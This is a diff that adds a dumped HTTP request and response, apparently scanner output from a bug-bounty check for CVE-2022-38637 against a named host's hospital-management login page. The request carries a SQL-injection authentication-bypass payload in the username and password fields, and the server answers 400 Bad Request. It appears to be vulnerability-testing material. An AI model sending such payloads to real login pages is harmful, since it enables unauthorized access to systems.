@@ -1,0 +1,25 @@
+[CVE-2022-38637] Dumped HTTP request for https://techsolutions.bitpanda.com/hms/user-login.php
+
+
+POST /hms/user-login.php HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Safari/605.1.15
+Connection: close
+Content-Length: 91
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=
+[CVE-2022-38637] Dumped HTTP response https://techsolutions.bitpanda.com/hms/user-login.php
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:22 GMT
+Via: 1.1 0fad2b2f93c2ade9df8e31249e9938a2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: WEm8L5XwA4ObaiA7Vei5UwoXvsyhT6RPAFO84c0uelWYxRqxK7-lgg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
